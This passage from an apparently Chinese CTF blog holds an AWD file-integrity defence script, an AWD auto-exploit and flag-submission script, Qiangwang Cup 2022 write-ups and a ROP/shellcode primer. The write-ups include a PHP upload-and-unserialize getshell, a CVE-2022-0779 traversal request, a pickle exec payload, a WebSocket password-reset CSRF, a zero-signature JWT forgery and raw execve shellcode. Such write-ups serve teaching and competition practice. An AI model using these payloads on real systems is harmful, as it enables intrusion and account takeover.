./\n\nimport os\nimport hashlib\nimport shutil\nimport ntpath\nimport time\n\nCWD = os.getcwd()\nFILE_MD5_DICT = &#123;&#125;      # 文件MD5字典\nORIGIN_FILE_LIST = []\n\n# 特殊文件路径字符串\nSpecial_path_str = &#39;drops_JWI96TY7ZKNMQPDRUOSG0FLH41A3C5EXVB82&#39;\nbakstring = &#39;bak_EAR1IBM0JT9HZ75WU4Y3Q8KLPCX26NDFOGVS&#39;\nlogstring = &#39;log_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD&#39;\nwebshellstring = &#39;webshell_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD&#39;\ndifffile = &#39;diff_UMTGPJO17F82K35Z0LEDA6QB9WH4IYRXVSCN&#39;\n\nSpecial_string = &#39;drops_log&#39;  # 免死金牌\nUNICODE_ENCODING = &quot;utf-8&quot;\nINVALID_UNICODE_CHAR_FORMAT = r&quot;\\?%02x&quot;\n\n# 文件路径字典\nspec_base_path = os.path.realpath(os.path.join(CWD, Special_path_str))\nSpecial_path = &#123;\n    &#39;bak&#39; : os.path.realpath(os.path.join(spec_base_path, bakstring)),\n    &#39;log&#39; : os.path.realpath(os.path.join(spec_base_path, logstring)),\n    &#39;webshell&#39; : os.path.realpath(os.path.join(spec_base_path, webshellstring)),\n    &#39;difffile&#39; : os.path.realpath(os.path.join(spec_base_path, difffile)),\n&#125;\n\ndef isListLike(value):\n    return isinstance(value, (list, tuple, set))\n\n# 获取Unicode编码\ndef getUnicode(value, encoding=None, noneToNull=False):\n\n    if noneToNull and value is None:\n        return NULL\n\n    if isListLike(value):\n        value = list(getUnicode(_, encoding, noneToNull) for _ in value)\n        return value\n\n    if isinstance(value, unicode):\n        return value\n    elif isinstance(value, basestring):\n        while True:\n            try:\n                return unicode(value, encoding or UNICODE_ENCODING)\n            except UnicodeDecodeError, ex:\n                try:\n                    return unicode(value, UNICODE_ENCODING)\n                except:\n                    value = value[:ex.start] + &quot;&quot;.join(INVALID_UNICODE_CHAR_FORMAT % ord(_) for _ in value[ex.start:ex.end]) + value[ex.end:]\n    else:\n        try:\n            return unicode(value)\n        except UnicodeDecodeError:\n            return unicode(str(value), errors=&quot;ignore&quot;)\n\n# 目录创建\ndef mkdir_p(path):\n    import errno\n    try:\n        os.makedirs(path)\n    except OSError as exc:\n        if exc.errno == errno.EEXIST and os.path.isdir(path):\n            pass\n        else: raise\n\n# 获取当前所有文件路径\ndef getfilelist(cwd):\n    filelist = []\n    for root,subdirs, files in os.walk(cwd):\n        for filepath in files:\n            originalfile = os.path.join(root, filepath)\n            if Special_path_str not in originalfile:\n                filelist.append(originalfile)\n    return filelist\n\n# 计算机文件MD5值\ndef calcMD5(filepath):\n    try:\n        with open(filepath,&#39;rb&#39;) as f:\n            md5obj = hashlib.md5()\n            md5obj.update(f.read())\n            hash = md5obj.hexdigest()\n            return hash\n    except Exception, e:\n        print u&#39;[!] getmd5_error : &#39; + getUnicode(filepath)\n        print getUnicode(e)\n        try:\n            ORIGIN_FILE_LIST.remove(filepath)\n            FILE_MD5_DICT.pop(filepath, None)\n        except KeyError, e:\n            pass\n\n# 获取所有文件MD5\ndef getfilemd5dict(filelist = []):\n    filemd5dict = &#123;&#125;\n    for ori_file in filelist:\n        if Special_path_str not in ori_file:\n            md5 = calcMD5(os.path.realpath(ori_file))\n            if md5:\n                filemd5dict[ori_file] = md5\n    return filemd5dict\n\n# 备份所有文件\ndef backup_file(filelist=[]):\n    # if len(os.listdir(Special_path[&#39;bak&#39;])) == 0:\n    for filepath in filelist:\n        if Special_path_str not in filepath:\n            shutil.copy2(filepath, Special_path[&#39;bak&#39;])\n\nif __name__ == &#39;__main__&#39;:\n    print u&#39;---------start------------&#39;\n    for value in Special_path:\n        mkdir_p(Special_path[value])\n    # 获取所有文件路径，并获取所有文件的MD5，同时备份所有文件\n    ORIGIN_FILE_LIST = getfilelist(CWD)\n    FILE_MD5_DICT = getfilemd5dict(ORIGIN_FILE_LIST)\n    backup_file(ORIGIN_FILE_LIST) # TODO 备份文件可能会产生重名BUG\n    print u&#39;[*] pre work end!&#39;\n    while True:\n        file_list = getfilelist(CWD)\n        # 移除新上传文件\n        diff_file_list = list(set(file_list) ^ set(ORIGIN_FILE_LIST))\n        if len(diff_file_list) != 0:\n            # import pdb;pdb.set_trace()\n            for filepath in diff_file_list:\n                try:\n                    f = open(filepath, &#39;r&#39;).read()\n                except Exception, e:\n                    break\n                if Special_string not in f:\n                    try:\n                        print u&#39;[*] webshell find : &#39; + getUnicode(filepath)\n                        shutil.move(filepath, os.path.join(Special_path[&#39;webshell&#39;], ntpath.basename(filepath) + &#39;.txt&#39;))\n                    except Exception as e:\n                        print u&#39;[!] move webshell error, &quot;%s&quot; maybe is webshell.&#39;%getUnicode(filepath)\n                    try:\n                        f = open(os.path.join(Special_path[&#39;log&#39;], &#39;log.txt&#39;), &#39;a&#39;)\n                        f.write(&#39;newfile: &#39; + getUnicode(filepath) + &#39; : &#39; + str(time.ctime()) + &#39;\\n&#39;)\n                        f.close()\n                    except Exception as e:\n                        print u&#39;[-] log error : file move error: &#39; + getUnicode(e)\n\n        # 防止任意文件被修改,还原被修改文件\n        md5_dict = getfilemd5dict(ORIGIN_FILE_LIST)\n        for filekey in md5_dict:\n            if md5_dict[filekey] != FILE_MD5_DICT[filekey]:\n                try:\n                    f = open(filekey, &#39;r&#39;).read()\n                except Exception, e:\n                    break\n                if Special_string not in f:\n                    try:\n                        print u&#39;[*] file had be change : &#39; + getUnicode(filekey)\n                        shutil.move(filekey, os.path.join(Special_path[&#39;difffile&#39;], ntpath.basename(filekey) + &#39;.txt&#39;))\n                        shutil.move(os.path.join(Special_path[&#39;bak&#39;], ntpath.basename(filekey)), filekey)\n                    except Exception as e:\n                        print u&#39;[!] move webshell error, &quot;%s&quot; maybe is webshell.&#39;%getUnicode(filekey)\n                    try:\n                        f = open(os.path.join(Special_path[&#39;log&#39;], &#39;log.txt&#39;), &#39;a&#39;)\n                        f.write(&#39;diff_file: &#39; + getUnicode(filekey) + &#39; : &#39; + getUnicode(time.ctime()) + &#39;\\n&#39;)\n                        f.close()\n                    except Exception as e:\n                        print u&#39;[-] log error : done_diff: &#39; + getUnicode(filekey)\n                        pass\n        time.sleep(2)\n        # print &#39;[*] &#39; + getUnicode(time.ctime())自动提交flagshellimport re\nimport requests\nimport json\nimport time\n\nhost = &quot;http://120.26.140.18:8000&quot;\ntarget_host = &quot;http://120.26.140.18:%d&quot;\nsubmit_url = &quot;http://120.26.140.18:8000/api/v1/challenges/attempt&quot;\nid = 4\n\nusername = &quot;Team2&quot;\npassword = &quot;adminadmin&quot;\nsession = requests.Session()\n\n\ntargets = [\n    11515, 11981, 11349, 11982, 11316, 11160\n]\n\n# 提取 flag\ndef regexp_out(data):\n    patterns = [\n        re.compile(r&#39;(flag&#123;.*?&#125;)&#39;),\n        re.compile(r&#39;xnuca&#123;(.*?)&#125;&#39;),\n        re.compile(r&#39;DASCTF&#123;(.*?)&#125;&#39;),\n        re.compile(r&#39;WMCTF&#123;.*?&#125;&#39;),\n        re.compile(r&#39;[0-9a-zA-Z]&#123;8&#125;-[0-9a-zA-Z]&#123;3&#125;-[0-9a-zA-Z]&#123;5&#125;&#39;),\n    ]\n\n    for pattern in patterns:\n        res = pattern.findall(data.decode() if isinstance(data, bytes) else data)\n        if len(res) &gt; 0:\n            return str(res[0])\n\n    return None\n\n# 提交函数\ndef submit(target_url, flag):\n    data = &#123;\n        &quot;challenge_id&quot;: str(id),\n        &quot;submission&quot;: flag,\n    &#125;\n\n    r = session.post(submit_url, json=data, allow_redirects=False)\n    response = json.loads(r.text)\n    print(&quot;target: %s - %s - %s \\n&quot; % (target_url, flag, response[&#39;data&#39;][&#39;message&#39;]))\n    if response[&#39;data&#39;][&#39;message&#39;] == &#39;Correct&#39; or response[&#39;data&#39;][&#39;message&#39;] == &#39;Do not submit again :(&#39;:\n        return True\n    else:\n        return False\n\n# 登录平台\ndef login():\n    login_url = f&quot;&#123;host&#125;/login&quot;\n    r = session.get(login_url)\n    nonce = re.findall(r&#39;var csrf_nonce = &quot;([0-9a-f]&#123;64&#125;)&quot;;&#39;, r.text)[0]\n    r.close()\n    data = &#123;\n        &quot;name&quot;: username,\n        &quot;password&quot;: password,\n        &quot;nonce&quot;: nonce\n    &#125;\n\n    r = session.post(login_url, data=data, allow_redirects=False)\n    text = r.text\n    status_code = r.status_code\n    r.close()\n\n\n    if &#39;Your username or password is incorrect&#39; not in text and status_code == 302:\n        # 获取平台的 CSRF 令牌\n        r = session.get(f&quot;&#123;host&#125;/challenges&quot;)\n        nonce = re.findall(r&#39;var csrf_nonce = &quot;([0-9a-f]&#123;64&#125;)&quot;;&#39;, r.text)[0]\n        r.close()\n        session.headers[&#39;CSRF-Token&#39;] = nonce\n        print(&quot;Login Success!&quot;)\n        return True\n\n    print(&quot;Login Failed!&quot;)\n    return False\n\ndef pwn1(target_url):\n    r = requests.get(f&quot;&#123;target_url&#125;/backdoor.php&quot;, params=&#123;&#39;file&#39;: &#39;/flag&#39;&#125;, allow_redirects=False)\n    text = r.text\n    r.close()\n    return submit(target_url, regexp_out(text))\n\ndef pwn2(target_url):\n    r = requests.get(f&quot;&#123;target_url&#125;/admin/views/update.php;&quot;, params=&#123;&#39;a&#39;: &quot;system(&#39;cat /flag&#39;)&quot;&#125;, allow_redirects=False)\n    text = r.text\n    r.close()\n    return submit(target_url, regexp_out(text))\n\ndef main():\n    # 登录平台\n    if not login(): return\n\n    while True:\n        for target_port in targets:\n            target_url = target_host % target_port\n            # 遍历不同的 payload\n            if pwn1(target_url): continue\n            if pwn2(target_url): continue\n        # 120秒跑一次 auto exp\n        time.sleep(120)\n\n\nif __name__ == &#39;__main__&#39;:\n    main()","slug":"AWD","date":"2022-11-14T22:34:21.000Z","categories_index":"AWD","tags_index":"AWD","author_index":"xmmlaz"},{"id":"a6ba9e79ebbec5d852da03b23e7284e1","title":"强网杯2022","content":"强网先锋farcefile扫描到 www.zip ，通过测试发现\n\n检查后缀和 content-type ，文件名是随机字符串\n数据存储于 cookie 中，通过 反序列化函数  还原并显示关键点在于 config.inc.php 文件中的 spl_autoload_register() 函数\n\nphp&lt;?php\nspl_autoload_register();\nerror_reporting(0);\n\nfunction e($str)&#123;\n    return htmlspecialchars($str);\n&#125;\n$userfile = empty($_COOKIE[&quot;userfile&quot;]) ? [] : unserialize($_COOKIE[&quot;userfile&quot;]);\n?&gt;\n&lt;p&gt;\n    &lt;a href=&quot;/index.php&quot;&gt;Index&lt;/a&gt;\n    &lt;a href=&quot;/showfile.php&quot;&gt;files&lt;/a&gt;\n&lt;/p&gt;spl_autoload_register()如果不指定处理用的函数，就会自动包含 类名.php 或 类名.inc 的文件，并加载其中的 类名 类通过源码看到黑名单中没有 .inc ，所以我们可以通过 .inc 文件来实现Getshell \nphp$blackext = [&quot;php&quot;, &quot;php5&quot;, &quot;php3&quot;, &quot;html&quot;, &quot;swf&quot;, &quot;htm&quot;,&quot;phtml&quot;];我们可以看到上传后，响应包里出现了一段 userfile 的 cookie\nshellSet-Cookie: userfile=a:1:&#123;i:0;s:36:&quot;340d9b3c0f5d7eff1c077d2ecd8c1c19.inc&quot;;&#125;\n然后我们序列化一个类名为 340d9b3c0f5d7eff1c077d2ecd8c1c19 的对象 \nphp&lt;?php \nclass 340d9b3c0f5d7eff1c077d2ecd8c1c19&#123;\n&#125;\n\n$flag = new 340d9b3c0f5d7eff1c077d2ecd8c1c19();\necho serialize($flag);\n// O:32:&quot;340d9b3c0f5d7eff1c077d2ecd8c1c19&quot;:0:&#123;&#125;直接在 c``ookie 中添加我们新生成的 反序列化 字符串即可\nWP_UM访问环境，出现一个引导安装页面，感觉有用的信息就是下面这段\n\n\n\n\n\n\n\n\n\n猫哥最近用wordpress搭建了一个个人博客，粗心的猫哥因为记性差，所以把管理员10位的账号作为文件名放在&#x2F;username下和15位的密码作为文件名放在&#x2F;password下。并且存放的时候猫哥分成一个数字(作为字母在密码中的顺序)＋一个大写或小写字母一个文件，例如admin分成5个文件，文件名是1a 2d 3m 4i 5n这几天他发现了一个特别好用的wordpress插件，在他开心的时候，可是倒霉的猫哥却不知道危险的存在。这段信息说插件有问题，然后题目附件里发现就俩插件 akismet 和 user-meta \n根据 user-meta 插件的版本 2.4.3 搜到了一个路径遍历漏洞 CVE-2022-0779，正好可以组合起来得到账号密码。\n请求包里的 pf_noncee 需要改成当前 pf_noncee ，获取方法：在网站首页查看页面源代码，搜索 pf_nonce 即可\nhttpPOST /wp-admin/admin-ajax.php HTTP/1.1\nHost: eci-2ze2ahooasrbklrp7npz.cloudeci1.ichunqiu.com\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 159\n\nfield_name=test&amp;filepath=/../../../../../../../../username/1M&amp;field_id=um_field_4&amp;form_key=Upload&amp;action=um_show_uploaded_file&amp;pf_nonce=e74a0c7bd4&amp;is_ajax=true我们可以发现，如果路径存在那么会有一个 Remove 反之没有\n账号( 10 位)密码( 15 位)，这些信息题目提都提到了，我们直接 burp 爆破 a-z , A-Z 即可，另外博客文章内泄露了用户名，同时爆破的时候发现第一位是 M 简单猜测了几位，所以说实际上只爆破了密码的第 6 位到第 15 位，还是挺快的。\nshell用户名：MaoGePaMao\n密码：MaoGeYaoQiFeiLa登录后台，外观 -&gt; 主题文件编辑器 处写shell (本意是直接写一句话，但是好像过滤了引号)，直接写个一句话到其他文件吧)\n他说 flag 藏起来了，连上蚁剑翻了半天，最后发现在 /usr/local/This_1s_secert \n\nASR下载附件得到一个 python 脚本\npythonfrom Crypto.Util.number import getPrime\nfrom secret import falg\npad = lambda s:s + bytes([(len(s)-1)%16+1]*((len(s)-1)%16+1))\n​\nn = getPrime(128)**2 * getPrime(128)**2 * getPrime(128)**2 * getPrime(128)**2\ne = 3\n​\nflag = pad(flag)\nprint(flag)\nassert(len(flag) &gt;= 48)\nm = int.from_bytes(flag,&#39;big&#39;)\nc = pow(m,e,n)\n​\nprint(f&#39;n = &#123;n&#125;&#39;)\nprint(f&#39;e = &#123;e&#125;&#39;)\nprint(f&#39;c = &#123;c&#125;&#39;)\n​\n&#39;&#39;&#39;\nn = 8250871280281573979365095715711359115372504458973444367083195431861307534563246537364248104106494598081988216584432003199198805753721448450911308558041115465900179230798939615583517756265557814710419157462721793864532239042758808298575522666358352726060578194045804198551989679722201244547561044646931280001\ne = 3\nc = 945272793717722090962030960824180726576357481511799904903841312265308706852971155205003971821843069272938250385935597609059700446530436381124650731751982419593070224310399320617914955227288662661442416421725698368791013785074809691867988444306279231013360024747585261790352627234450209996422862329513284149\n&#39;&#39;&#39;我们先用 factordb 把 n 分解一下，得到\nshellp1 = 218566259296037866647273372633238739089\np2 = 223213222467584072959434495118689164399\np3 = 225933944608558304529179430753170813347\np4 = 260594583349478633632570848336184053653 e|p1-1|p3-1，需要代替，进行一些尝试得出 n 也可以近似等于 p2**2*p4**2\npythonimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n​\nn = 8250871280281573979365095715711359115372504458973444367083195431861307534563246537364248104106494598081988216584432003199198805753721448450911308558041115465900179230798939615583517756265557814710419157462721793864532239042758808298575522666358352726060578194045804198551989679722201244547561044646931280001\ne = 3\nc = 945272793717722090962030960824180726576357481511799904903841312265308706852971155205003971821843069272938250385935597609059700446530436381124650731751982419593070224310399320617914955227288662661442416421725698368791013785074809691867988444306279231013360024747585261790352627234450209996422862329513284149\n​\np1 = 218566259296037866647273372633238739089\np2 = 223213222467584072959434495118689164399\np3 = 225933944608558304529179430753170813347\np4 = 260594583349478633632570848336184053653\n​\nassert(n==(p1*p2*p3*p4)**2)\ndata = gmpy2.invert(e, (p2-1)*p2*p4*(p4-1))\nprint(long_to_bytes(pow(c, data, p2**2*p4**2)))\n​\n# flag&#123;Fear_can_hold_you_prisoner_Hope_can_set_you_free&#125;polydiv第一步考察pwn的使用起到交互作用，第二步在整数环中的多项式乘除法使用sagemath求解，得到数据并进行40轮爆破求解\npythonimport string\nfrom hashlib import *\nfrom pwn import *\nimport itertools\nfrom sage.all import *\nstrs = string.ascii_letters + string.digits\nPR = PolynomialRing(Zmod(2),name=&#39;x&#39;)\nx = PR.gen()\n\ndef proof(end,sha):\n    num=4\n    slist=itertools.permutations(strs,int(num))\n    for i in slist:\n        i=&#39;&#39;.join(i)\n        if sha256((i+end.decode()).encode()).hexdigest()==sha.decode():\n            return i\n\ndef poly(s):\n    fx = 0\n    if s[-1] ==&#39;1&#39;:\n        fx=1\n    if &#39;x&#39; in s.replace(&#39;x^&#39;,&#39;&#39;):\n        fx+=x\n    for i in range(2,15):\n        if str(i) in s:\n            fx+=x^i\n    return fx\n\nio=remote(&#39;39.107.137.85&#39; ,41366)\ncontext.log_level=&#39;debug&#39;\nio.recvuntil(&#39;sha256(XXXX+&#39;)\nmessage=io.recvuntil(&#39;\\n&#39;)[:-1]\nend=message[:16]\nSHA=message[-64:]\nxxxx=proof(end,SHA)\nio.sendafter(&#39;Give me XXXX: &#39;,xxxx)\n\nfor i in range(40):\n    io.recvuntil(&#39;r(x) = &#39;)\n    rx = poly(io.recvuntil(&#39;\\n&#39;)[:-1].decode())\n    io.recvuntil(&#39;a(x) = &#39;)\n    ax = poly(io.recvuntil(&#39;\\n&#39;)[:-1].decode())\n    io.recvuntil(&#39;c(x) = &#39;)\n    cx = poly(io.recvuntil(&#39;\\n&#39;)[:-1].decode())\n    bx = (rx-cx)//ax\n    print(rx,ax,bx)\n    io.sendafter(&#39;&gt; b(x) = &#39;,str(bx))\nio.recvall()\nWebbabyweb随手注册一个账号登录后，根据提示发送 help ，返回如下信息\n\n一开始看到 bugreport 命令（发送 bugreport 网址  管理员会去请求你发送的网址），觉得应该是 XSS 钓管理员的 cookie，但是一直没成功。接收不到请求。\n后来考虑到利用 bugreport 和 changepw 功能修改管理员密码 ，根据页面中的 js ，简单构造 ws 的请求，上传到自己的服务器， 试了半天还是不行，最后考虑到不出网，题目描述里给了 docker 容器映射的端口，所以脚本里的 ws 地址改为 ws://127.0.0.1:8888\nbashdocker run -dit -p &quot;0.0.0.0:pub_port:8888&quot; babyweb\nshell&lt;meta charset=&quot;utf‐8&quot; /&gt;\n&lt;script&gt;\nvar ws = null;\nvar url = &quot;ws://127.0.0.1:8888/bot&quot;;\n\nws = new WebSocket(url);\nws.onopen = function (event) &#123;\n    var msg = &quot;changepw 123456&quot;;\n    ws.send(msg);\n&#125;\n&lt;/script&gt;在对话框里发送 bugreport poc地址 ，然后 admin的密码就会被重置为 123456，重新登录 admin 账户购买 Hint 得到题目源码 /static/qwb_source_12580.zip\n\n查看源码发现限制的很死，必须在定义的范围内、必须是数字之类的，最后考虑到 python 和 go 俩语言不同，json 解释器也不同，绕过了限制\n\n返回页面得到flag\n\ncrash访问首页得到题目源代码\npythonimport base64\n# import sqlite3\nimport pickle\nfrom flask import Flask, make_response,request, session\nimport admin\nimport random\n\napp = Flask(__name__,static_url_path=&#39;&#39;)\napp.secret_key=random.randbytes(12)\n\nclass User:\n    def __init__(self, username,password):\n        self.username=username\n        self.token=hash(password)\n\ndef get_password(username):\n    if username==&quot;admin&quot;:\n        return admin.secret\n    else:\n        # conn=sqlite3.connect(&quot;user.db&quot;)\n        # cursor=conn.cursor()\n        # cursor.execute(f&quot;select password from usertable where username=&#39;&#123;username&#125;&#39;&quot;)\n        # data=cursor.fetchall()[0]\n        # if data:\n        #     return data[0] \n        # else:\n        #     return None\n        return session.get(&quot;password&quot;)\n\n@app.route(&#39;/balancer&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])\ndef flag():\n    pickle_data=base64.b64decode(request.cookies.get(&quot;userdata&quot;))\n    if b&#39;R&#39; in pickle_data or b&quot;secret&quot; in pickle_data:\n        return &quot;You damm hacker!&quot;\n    os.system(&quot;rm -rf *py*&quot;)\n    userdata=pickle.loads(pickle_data)\n    if userdata.token!=hash(get_password(userdata.username)):\n         return &quot;Login First&quot;\n    if userdata.username==&#39;admin&#39;:\n        return &quot;Welcome admin, here is your next challenge!&quot;\n    return &quot;You&#39;re not admin!&quot;\n\n@app.route(&#39;/login&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])\ndef login():\n    resp = make_response(&quot;success&quot;) \n    session[&quot;password&quot;]=request.values.get(&quot;password&quot;)\n    resp.set_cookie(&quot;userdata&quot;, base64.b64encode(pickle.dumps(User(request.values.get(&quot;username&quot;),request.values.get(&quot;password&quot;)),2)), max_age=3600)\n    return resp\n\n@app.route(&#39;/&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])\ndef index():\n    return open(&#39;source.txt&#39;,&quot;r&quot;).read()\n\nif __name__ == &#39;__main__&#39;:\n    app.run(host=&#39;0.0.0.0&#39;, port=5000)登陆 admin ，用户名和密码通过 GET 传参。经过序列化操作和 base64 编码后放到 cookie 里\npythondef login():\n    resp = make_response(&quot;success&quot;) \n    session[&quot;password&quot;]=request.values.get(&quot;password&quot;)\n    resp.set_cookie(&quot;userdata&quot;, base64.b64encode(pickle.dumps(User(request.values.get(&quot;username&quot;),request.values.get(&quot;password&quot;)),2)), max_age=3600)\n    return resp我们发现 admin 的密码是本地变量 secret ，但是不知道 secret 的值是多少\npythondef get_password(username):\n    if username==&quot;admin&quot;:\n        return admin.secret我们可以通过 pickle 反序列化实现 变量覆盖 ，注意传入的序列化字符串中不能出现 R 和 secret \npythonif b&#39;R&#39; in pickle_data or b&quot;secret&quot; in pickle_data:\n        return &quot;You damm hacker!&quot;我们使用双层 exec 绕过\npythonimport base64\n\ndata = b&#39;&#39;&#39;(S&#39;exec(&#39;admin.se&#39;+&#39;cret=&quot;admin&quot;&#39;)&#39;\ni__builtin__\nexec\n.&#39;&#39;&#39;\n\nprint(base64.b64encode(data))\n# KFMnZXhlYygnYWRtaW4uc2UnKydjcmV0PSJhZG1pbiInKScKaV9fYnVpbHRpbl9fCmV4ZWMKLg==此时页面显示成功\nshellhttp://39.107.237.149:25512/login?username=admin&amp;password=admin此时访问 /balancer 会提示 You&#39;re not admin!，我们修改一下 cookie再去请求/balancer\nshelluserdata=KFMnZXhlYygnYWRtaW4uc2UnKydjcmV0PSJhZG1pbiInKScKaV9fYnVpbHRpbl9fCmV4ZWMKLg==请求后页面提示 500 ，重新请求一次即可返回正常页面。\n这里又提示 flag in 504 page ，所以说这个页面应该是最终得到能flag页面\n然后还给了一个 /826fd2f86129b050875e4a70cb059908a7ed  我们直接构造请求一下\n\n访问后得到一个 nginx 配置文件\nnginx# nginx.vh.default.conf  --  docker-openresty\n#\n# This file is installed to:\n#   `/etc/nginx/conf.d/default.conf`\n#\n# It tracks the `server` section of the upstream OpenResty&#39;s `nginx.conf`.\n#\n# This config (and any other configs in `etc/nginx/conf.d/`) is loaded by\n# default by the `include` directive in `/usr/local/openresty/nginx/conf/nginx.conf`.\n#\n# See https://github.com/openresty/docker-openresty/blob/master/README.md#nginx-config-files\n#\nlua_package_path &quot;/lua-resty-balancer/lib/?.lua;;&quot;;\nlua_package_cpath &quot;/lua-resty-balancer/?.so;;&quot;;\n\nserver &#123;\n    listen       8088;\n    server_name  localhost;\n\n    #charset koi8-r;\n    #access_log  /var/log/nginx/host.access.log  main;\n\n    location /gettestresult &#123;\n            default_type text/html;\n            content_by_lua &#39;\n                local resty_roundrobin = require &quot;resty.roundrobin&quot;\n                local server_list = &#123;\n                    [ngx.var.arg_server1] = ngx.var.arg_weight1,\n                    [ngx.var.arg_server2] = ngx.var.arg_weight2,\n                    [ngx.var.arg_server3] = ngx.var.arg_weight3,\n                &#125;\n                local rr_up = resty_roundrobin:new(server_list)\n                for i = 0,9 do\n                    ngx.say(&quot;Server seleted for request &quot;,i,&quot;: &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&quot; ,rr_up:find(),&quot;&lt;br&gt;&quot;)\n                end\n            &#39;;\n    &#125;\n\n    #error_page  404              /404.html;\n\n    # redirect server error pages to the static page /50x.html\n    #\n\n\n\n    # proxy the PHP scripts to Apache listening on 127.0.0.1:80\n    #\n    #location ~ \\.php$ &#123;\n    #    proxy_pass   http://127.0.0.1;\n    #&#125;\n\n    # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000\n    #\n    #location ~ \\.php$ &#123;\n    #    root           /usr/local/openresty/nginx/html;\n    #    fastcgi_pass   127.0.0.1:9000;\n    #    fastcgi_index  index.php;\n    #    fastcgi_param  SCRIPT_FILENAME  /scripts$fastcgi_script_name;\n    #    include        fastcgi_params;\n    #&#125;\n\n    # deny access to .htaccess files, if Apache&#39;s document root\n    # concurs with nginx&#39;s one\n    #\n    #location ~ /\\.ht &#123;\n    #    deny  all;\n    #&#125;\n&#125;文件总共都提到了仨地址，直接都填上，然后 权重 的话，根据多年建站经验来说，数值越低，优先级越高，我们直接都设置为 0 ,或者相同数，然后让这仨冲突去吧。\nshell127.0.0.1\n127.0.0.1:8088\n127.0.0.1:900静待十几秒，页面返回了 flag ，同时控制台里可以看到请求的接口 504 超时了\nCryptomyJWTnc 连接后输入用户名，然后输入 1  获得 generate token，返回一段 JWT，然后输入 2 去 getflag 提示输入 your token 后返回 You are not the administrator.，我们直接解密 JWT 看看\nshelleyJ0eXAiOiJKV1QiLCJhbGciOiJteUVTIn0=.eyJpc3MiOiJxd2IiLCJuYW1lIjoiaWFtaTIzMyIsImFkbWluIjpmYWxzZSwiZXhwIjoxNjU5MzM4MTIxNzAwfQ==.5IQnppqB0_rC4OOaCowkLXVYW6eJ1kI6P-IR3dXll0gDYFjQKyOrHbVp10Hrm3GFh8eRBVZok9_z1rrKUQcJUBqQs-PeZElzqrZwE4rPVxJr2fngi2u97HdG4ItmvWiS很明显看到一个权限校验字段 &quot;admin&quot;: false,\n我们先 base64 解码后把 false 改为 true，重新编码为 base64\nshelleyJpc3MiOiJxd2IiLCJuYW1lIjoiaWFtaTIzMyIsImFkbWluIjpmYWxzZSwiZXhwIjoxNjU5MzM4MTIxNzAwfQ==\n&#123;&quot;iss&quot;:&quot;qwb&quot;,&quot;name&quot;:&quot;iami233&quot;,&quot;admin&quot;:false,&quot;exp&quot;:1659338121700&#125;\n&#123;&quot;iss&quot;:&quot;qwb&quot;,&quot;name&quot;:&quot;iami233&quot;,&quot;admin&quot;:true,&quot;exp&quot;:1659338121700&#125;\neyJpc3MiOiJxd2IiLCJuYW1lIjoiaWFtaTIzMyIsImFkbWluIjp0cnVlLCJleHAiOjE2NTkzMzgxMjE3MDB9\n\n\n\n\n\n\n\n\n\nCVE-2022-21449：传入sig值对(r, s)为(0, 0)时，可以绕过验证最后一段数据我们用 0 填充，原数据是 128 位，我们也用128 个 A 填充\nshelleyJ0eXAiOiJKV1QiLCJhbGciOiJteUVTIn0=.eyJpc3MiOiJxd2IiLCJuYW1lIjoiaWFtaTIzMyIsImFkbWluIjp0cnVlLCJleHAiOjE2NTkzMzgxMjE3MDB9.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA注意 token 失效时间有点快，所以整体做的时候速度快一点，当然也可以用脚本实现自动化\nMisc签到直接复制粘贴即可\n问卷调查回答问卷提交即可得到flag\n","slug":"强网杯2022","date":"2022-07-29T23:44:33.000Z","categories_index":"CTF","tags_index":"WP","author_index":"xmmlaz"},{"id":"20032183053bd6117641c219a5d520bb","title":"PWN的基本ROP链构造","content":"查找对应溢出一般的溢出内容是EIP，因为EIP寄存器存储着我们CPU要读取指令的地址\n可以通过 cyclic 数字这个指令来获取判断溢出点的一个长度为输入的一个字符串，再通过gdb调试观察EIP寄存器处的 4 位字符，通过指令cyclic -l 对应EIP的4位字符，得到需要填充的溢出字符长度。\n保护模式NX：防止栈上执行 (需要利用到 bss 段)\nCanary：检测是否发生栈溢出 \nRet2text通过计算溢出点的地址到对应返回的栈顶（ebp）的距离来进行溢出，同时要加上对应 ret 所占的 4 个字节。\n对应 exp 构造模式：\ntxtshellcode = 对应 /bin/sh/ 地址 \npayload = &#39;a&#39;*[溢出点到栈顶距离] + &#39;A&#39;*4 + p32/p64(shellcode)Ret2shellcode程序中没有出现 &#x2F;bin&#x2F;sh&#x2F; 地址需要自己构造，构造方式有两种：\n\n23字节\ntxt\n\nshellcode &#x3D; “\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05”\ntxt\n- 44字节\n  from pwn import *  shellcode &#x3D; asm(shellcraft.sh())\ntxt\n一般实现溢出方式类似于 ret2text ，不同的是需要使用 `vmmap`检查对应的权限，同时也需要观察`bss`**（检查溢出点是否定义在 bss 段上）**\n\n**对应 exp 构造模式：**\nbss &#x3D; bss对应的地址shellcode &#x3D; 构造一个shellpayload &#x3D; shellcode.ljust(‘a’,溢出长度) + p32&#x2F;p64(bss)\ntxt\n## Ret2syscall\n\n程序中同样没有出现 /bin/sh/ 地址需要自己构造，原理为把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们再执行 int 0x80 就可执行对应的系统调用（知识点`Linux`下系统调用）。\n\n学习链接：[ret2syscall原理详解与实例分析 